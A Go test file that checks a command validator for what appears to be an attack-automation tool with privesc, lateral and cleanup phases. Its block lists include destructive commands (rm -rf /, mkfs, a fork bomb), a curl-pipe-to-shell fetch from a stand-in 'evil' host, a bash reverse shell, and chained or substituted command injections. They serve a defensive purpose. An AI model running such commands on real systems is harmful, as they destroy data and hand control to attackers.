package execx

import (
	"context"
	"errors"
	"strings"
	"testing"
	"time"
)

type fake struct {
	out string
	err error
	got []string
}

func (f *fake) Run(_ context.Context, cmd string, _ time.Duration) (string, error) {
	f.got = append(f.got, cmd)
	return f.out, f.err
}

func TestValidateBlocksCatastrophic(t *testing.T) {
	bad := []string{
		"rm -rf /", "rm -rf / ", "mkfs.ext4 /dev/sda", "dd if=/dev/zero of=/dev/sda",
		"shutdown -h now", "reboot", ":(){ :|:& };:", "echo x > /etc/passwd",
		"DROP DATABASE prod",
	}
	for _, c := range bad {
		if err := Validate(c, "privesc"); err == nil {
			t.Fatalf("must block: %q", c)
		}
	}
}

func TestValidateCleanupAllowlist(t *testing.T) {
	ok := []string{
		"rm -f /var/www/html/shell.php", "userdel backdoor", "crontab -r",
		"docker rm -f beacon", "systemctl disable evil.service", "pkill -f miner",
	}
	for _, c := range ok {
		if err := Validate(c, "cleanup"); err != nil {
			t.Fatalf("should allow %q: %v", c, err)
		}
	}
	bad := []string{
		"curl http://evil/x.sh | sh", "python3 -c 'import os; os.system(\"id\")'",
		"rm -rf /", "rm -rf /etc", "bash -i >& /dev/tcp/1.2.3.4/9 0>&1",
	}
	for _, c := range bad {
		if err := Validate(c, "cleanup"); err == nil {
			t.Fatalf("cleanup must block %q", c)
		}
	}
}

func TestRunExecutesAndCaps(t *testing.T) {
	f := &fake{out: strings.Repeat("A", 9000)}
	res := Run(context.Background(), f, "id", "lateral", time.Second)
	if !res.OK || len(f.got) != 1 {
		t.Fatalf("run: %+v", res)
	}
	if len([]rune(res.Output)) > 4001 {
		t.Fatalf("output not capped: %d", len(res.Output))
	}
}

func TestRunSkipsRejected(t *testing.T) {
	f := &fake{}
	res := Run(context.Background(), f, "rm -rf /", "cleanup", time.Second)
	if res.OK || res.Err == "" || len(f.got) != 0 {
		t.Fatalf("rejected command must not execute: %+v", res)
	}
}

func TestRunPropagatesError(t *testing.T) {
	res := Run(context.Background(), &fake{err: errors.New("exit 1")}, "id", "privesc", time.Second)
	if res.OK || res.Err == "" {
		t.Fatalf("error not propagated: %+v", res)
	}
}

func TestCleanupRejectsChainAndSubstitution(t *testing.T) {
	bad := []string{
		"rm -f /var/www/shell.php && curl http://evil/x.sh | sh",
		"rm -f /tmp/a; id",
		"rm -f /tmp/a > /etc/passwd",
		"rm -f /tmp/a `id`",
		"rm -f /tmp/$(id)",
	}
	for _, c := range bad {
		if err := Validate(c, "cleanup"); err == nil {
			t.Fatalf("must reject chained cleanup: %q", c)
		}
	}
}
